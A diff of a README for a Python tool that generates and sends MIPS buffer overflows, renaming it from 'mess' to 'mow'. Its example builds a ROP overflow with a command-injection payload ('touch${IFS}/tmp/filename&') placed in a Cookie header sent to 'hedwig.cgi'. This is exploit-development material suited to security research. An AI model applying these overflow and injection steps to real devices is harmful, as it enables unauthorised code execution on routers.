@@ -1,8 +1,7 @@
-# mess
-Mips Exploitation Starter Stub - Quickly write MIPS big/little endian overflows.
+# mow
+Mips Overflow Writer - Quickly write MIPS big/little endian overflows.
 
-Does the name really make sense? I don't know, but its a decent acronym. This 
-python file allows the user to quickly generate and send MIPS based overflows. 
+This python file allows the user to quickly generate and send MIPS based overflows. 
 Simply have to craft an overflow and send it to the target. 
 
 ## Example
@@ -44,8 +43,8 @@ Other value of importance found through analysis are:
 
 ### Generating the Overflow
 ```bash
->>> import mess
->>> overflow = mess.Overflow(0x400, 8, mess.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
+>>> import mow
+>>> overflow = mow.Overflow(0x400, 8, mow.LITTLE_ENDIAN, 0, 0x2aaf8000, '/runtime/session/')
 >>> overflow.s0 = 0x531f8
 >>> overflow.s1 = 0x15b6c
 >>> overflow.ra = 0x57d60
@@ -71,7 +70,7 @@ stack = b'XXXXXXXXXXXXXXXXXXXXXXXXtouch${IFS}/tmp/filename&'
 ### Creating the Packet 
 
 ```bash
->>> request = mess.CustomRequest('127.0.0.1', 80, mess.POST, 'hedwig.cgi', {'Cookie': b'uid=%s' % of_string}, 'doesntmatter')
+>>> request = mow.CustomRequest('127.0.0.1', 80, mow.POST, 'hedwig.cgi', {'Cookie': b'uid=%s' % of_string}, 'doesntmatter')
 >>> packet = request.create_packet()
 ********************
 Packet Generation
@@ -88,7 +87,7 @@ doesntmatter
 ### Sending the Packet
 
 ```bash
-mess.send_packet('127.0.0.1', 80, packet)
+mow.send_packet('127.0.0.1', 80, packet)
 ```
 
 ### Future Work
